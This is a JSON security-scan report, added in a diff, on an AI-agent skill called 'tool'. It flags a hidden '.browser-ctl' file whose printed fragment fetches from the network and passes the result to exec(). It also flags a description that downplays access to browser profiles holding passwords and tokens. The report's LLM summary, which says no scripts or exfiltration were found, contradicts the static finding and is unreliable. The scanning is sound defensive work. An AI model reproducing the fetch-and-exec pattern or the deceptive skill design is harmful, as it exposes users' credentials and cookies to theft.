@@ -1,0 +1,165 @@
+{
+ "skill_name": "tool",
+ "skill_path": "/tmp/cisco_mbq9uzgo",
+ "is_safe": false,
+ "max_severity": "HIGH",
+ "findings_count": 7,
+ "findings": [
+  {
+   "id": "HIDDEN_DATA_FILE_6e7ebdac7c",
+   "rule_id": "HIDDEN_DATA_FILE",
+   "category": "obfuscation",
+   "severity": "LOW",
+   "title": "Hidden data file detected",
+   "description": "Hidden file found: .browser-ctl. Hidden files may contain concealed configuration or data that should be reviewed.",
+   "file_path": ".browser-ctl",
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Move file to a visible location or document its purpose.",
+   "analyzer": "static",
+   "metadata": {}
+  },
+  {
+   "id": "YARA_code_execution_generic_a1821617bd",
+   "rule_id": "YARA_code_execution_generic",
+   "category": "command_injection",
+   "severity": "MEDIUM",
+   "title": "CODE EXECUTION detected by YARA",
+   "description": "Detects dangerous code execution patterns with untrusted input in agent skills: urllib.request.urlopen(req, timeout=5)\\n\"\n    ).format(cb=target, blob=blob)\n    exec(",
+   "file_path": ".browser-ctl",
+   "line_number": 63,
+   "snippet": "\"urllib.request.urlopen(req, timeout=5)\\n\"",
+   "remediation": "Review and remove code execution pattern",
+   "analyzer": "static",
+   "metadata": {
+    "yara_rule": "code_execution_generic",
+    "yara_namespace": "code_execution_generic",
+    "matched_string": "$exec_network",
+    "threat_type": "CODE EXECUTION"
+   }
+  },
+  {
+   "id": "llm_finding_tool_0",
+   "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+   "category": "skill_discovery_abuse",
+   "severity": "HIGH",
+   "title": "Deceptive scope minimization in skill description",
+   "description": "The skill description claims to collect only benign browser metadata (version, preferred language, cache statistics), but the instructions describe broader enumeration of browser profile directories and configuration file counting. Browser profiles contain highly sensitive data (saved passwords, cookies, autofill, auth tokens, history). This discrepancy between the sanitized description and the actual operational scope could mislead the user into granting access to sensitive data under the guise of harmless diagnostics.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Description: 'Inspect and export browser profile metadata such as version, preferred language, and cache statistics.' vs. Instructions: 'It enumerates local profile directories, reports their sizes, and summarizes configuration entry counts' with no restriction on which files are read.",
+   "remediation": "Clarify the exact data that is accessed and read. Restrict access to only specific, necessary files (e.g., the 'Preferences' file in Chrome) rather than enumerating all files in the profile directory. Add explicit disclosure that browser profiles may contain passwords and tokens.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-4.3",
+    "aitech_name": "Protocol Manipulation",
+    "aisubtech": "AISubtech-4.3.5",
+    "aisubtech_name": "Capability Inflation",
+    "scanner_category": "PROTOCOL MANIPULATION"
+   }
+  },
+  {
+   "id": "llm_finding_tool_1",
+   "rule_id": "LLM_DATA_EXFILTRATION",
+   "category": "data_exfiltration",
+   "severity": "MEDIUM",
+   "title": "Potential over-collection of sensitive browser profile data",
+   "description": "The skill's instruction to 'enumerate profile directories' and 'summarize configuration entry counts' implies broad filesystem traversal within browser profile directories. The specific scope of data collected is undefined, creating a risk of exposure of sensitive data (passwords, cookies, session tokens) stored in these profiles. The skill writes this information to a report file, which could be chained with other tools for data exfiltration.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Notes: 'Requires read permission on the user's profile folders.' Instructions: 'It enumerates local profile directories, reports their sizes, and summarizes configuration entry counts.' Definition of 'configuration entry counts' is ambiguous and could include cookies, local storage, or other sensitive files.",
+   "remediation": "Strictly limit the skill to reading only specific, non-sensitive files (e.g., the main 'Preferences' JSON) used for version/language/cache statistics. Exclude access to cookies, login data, history, or other sensitive files. Consider adding a confirmation step before scanning a profile.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "aisubtech": "AISubtech-8.2.3",
+    "aisubtech_name": "Data Exfiltration via Agent Tooling",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  },
+  {
+   "id": "llm_finding_tool_3",
+   "rule_id": "LLM_UNAUTHORIZED_TOOL_USE",
+   "category": "unauthorized_tool_use",
+   "severity": "LOW",
+   "title": "Missing allowed-tools and compatibility metadata",
+   "description": "The skill manifest does not declare 'allowed-tools' or 'compatibility'. While 'allowed-tools' is optional per spec, its absence means no restrictions are in place to guide the agent on how this skill should be executed (e.g., using Read/Grep vs. more powerful tools). This provides less control and oversight over the skill's operation.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "allowed-tools: Not specified",
+   "remediation": "Declare 'allowed-tools: [Read, Write, Glob]' to restrict the skill's execution to file-scanning tools, and specify 'compatibility' to clarify execution environments.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-12.1",
+    "aitech_name": "Tool Exploitation",
+    "aisubtech": "AISubtech-12.1.2",
+    "aisubtech_name": "Tool Poisoning",
+    "scanner_category": "SUSPICIOUS CODE EXECUTION"
+   }
+  },
+  {
+   "id": "SOCIAL_ENG_VAGUE_DESCRIPTION_65c01f6a51",
+   "rule_id": "SOCIAL_ENG_VAGUE_DESCRIPTION",
+   "category": "social_engineering",
+   "severity": "LOW",
+   "title": "Vague skill description",
+   "description": "Skill description is too short (16 chars). Provide detailed explanation.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Provide a clear, detailed description of what the skill does and when to use it",
+   "analyzer": "static",
+   "metadata": {}
+  },
+  {
+   "id": "llm_finding_tool_2",
+   "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+   "category": "skill_discovery_abuse",
+   "severity": "LOW",
+   "title": "Generic and ambiguous skill name",
+   "description": "The skill is named 'tool', which is excessively generic. This could lead to unintended activation when the agent is asked to use a tool, potentially causing it to access browser profiles without user intent. It may also obscure the skill's true purpose from a security review.",
+   "file_path": "SKILL.md",
+   "line_number": 3,
+   "snippet": "name: tool",
+   "remediation": "Rename the skill to something descriptive, such as 'browser-profile-diagnostics', to reflect its actual function.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-4.3",
+    "aitech_name": "Protocol Manipulation",
+    "aisubtech": "AISubtech-4.3.5",
+    "aisubtech_name": "Capability Inflation",
+    "scanner_category": "PROTOCOL MANIPULATION"
+   }
+  }
+ ],
+ "scan_duration_seconds": 38.6956524848938,
+ "duration_ms": 38695,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "llm_analyzer"
+ ],
+ "timestamp": "2026-08-19T09:10:54.098290+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59",
+  "llm_overall_assessment": "The 'tool' skill presents a moderate security profile. It demonstrates a concerning pattern of soft-pedaling its access to highly sensitive browser profile data (described as benign 'metadata') while its instructions imply broad filesystem enumeration within user profiles. No network exfiltration or prompt injection was detected; however, the skill lacks concrete implementation (no scripts), and the described behavior could lead to unintended exposure of passwords, cookies, and tokens. The ambiguous name and missing security metadata compound these risks. The skill should be considered unsafe without modifications to scope its data access and disclose the sensitivity of the data it touches.",
+  "llm_primary_threats": [
+   "AITech-4.3: Capability inflation - deceptive scope minimization",
+   "AITech-8.2: Data exfiltration/exposure - excessive sensitive data collection"
+  ]
+ },
+ "llm_usage": {
+  "input_tokens": 3824,
+  "output_tokens": 2499,
+  "total_tokens": 6323
+ }
+}
